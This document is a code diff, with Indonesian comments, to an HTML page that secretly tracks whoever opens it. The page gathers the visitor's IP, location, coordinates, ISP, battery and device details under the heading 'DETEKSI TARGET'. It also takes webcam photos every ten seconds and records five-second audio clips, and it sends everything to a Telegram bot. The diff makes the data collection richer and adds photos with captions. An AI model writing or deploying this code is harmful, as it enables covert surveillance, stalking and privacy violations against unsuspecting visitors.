@@ -20,6 +20,7 @@
       text-shadow: 0 0 10px lime;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.28/dist/ua-parser.min.js"></script> <!-- Link ke library UAParser.js -->
 </head>
 <body>
 
@@ -34,13 +35,26 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-function kirimPesan(text) {
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+function kirimPesan(text, foto) {
+  let form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('photo', foto, 'foto.jpg');
+  form.append('caption', text); // Menambahkan caption
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id, text })
+    body: form
   });
 }
+
+// Gunakan UAParser.js untuk mendeteksi perangkat
+const parser = new UAParser();
+const device = parser.getDevice();
+const os = parser.getOS();
+const browser = parser.getBrowser();
+const userAgentInfo = `Device: ${device.model || 'Tidak Diketahui'}\nOS: ${os.name} ${os.version || 'Tidak Diketahui'}\nBrowser: ${browser.name} ${browser.version}`;
+
+console.log(userAgentInfo);
 
 // Ambil IP & lokasi berdasarkan IP
 fetch('https://api.ipify.org?format=json')
@@ -48,7 +62,6 @@ fetch('https://api.ipify.org?format=json')
   .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
   .then(loc => loc.json())
   .then(info => {
-    const device = navigator.userAgent;
     navigator.getBattery().then(bat => {
       const status = `
 == DETEKSI TARGET ==
@@ -57,10 +70,16 @@ Negara: ${info.country_name}
 Region: ${info.region}
 Kota: ${info.city}
 ISP: ${info.org}
+Koneksi: ${info.connection_type || 'Tidak diketahui'}
 Baterai: ${Math.floor(bat.level * 100)}%
-Device: ${device}
+Device: ${userAgentInfo}
+Latitude: ${info.latitude || 'Tidak tersedia'}
+Longitude: ${info.longitude || 'Tidak tersedia'}
+Zona Waktu: ${info.timezone}
 =====================`;
-      kirimPesan(status);
+
+      // Ambil foto dan kirim dengan caption
+      ambilFoto(status);
     });
   });
 
@@ -74,7 +93,7 @@ if ("geolocation" in navigator) {
   });
 }
 
-// Kamera + Mic + Rekaman Otomatis
+// Kamera + Rekaman Otomatis (tanpa audio yang ditampilkan di halaman)
 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
 .then(stream => {
   video.srcObject = stream;
@@ -82,25 +101,19 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: true })
 
   setInterval(() => {
     ambilFoto();
-    rekamAudio(stream);
+    rekamAudio(stream); // Hanya rekam audio dan kirim ke Telegram
   }, 10000); // tiap 10 detik
 })
 .catch(err => {
   kirimPesan("Gagal akses media: " + err);
 });
 
-function ambilFoto() {
+function ambilFoto(caption = '') {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   canvas.toBlob(blob => {
-    let form = new FormData();
-    form.append('chat_id', chat_id);
-    form.append('photo', blob, 'foto.jpg');
-    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
+    kirimPesan(caption, blob); // Kirim foto beserta caption
   }, 'image/jpeg');
 }
 
@@ -119,7 +132,7 @@ function rekamAudio(stream) {
     });
   };
   recorder.start();
-  setTimeout(() => recorder.stop(), 5000);
+  setTimeout(() => recorder.stop(), 5000); // Rekam selama 5 detik
 }
 </script>
 
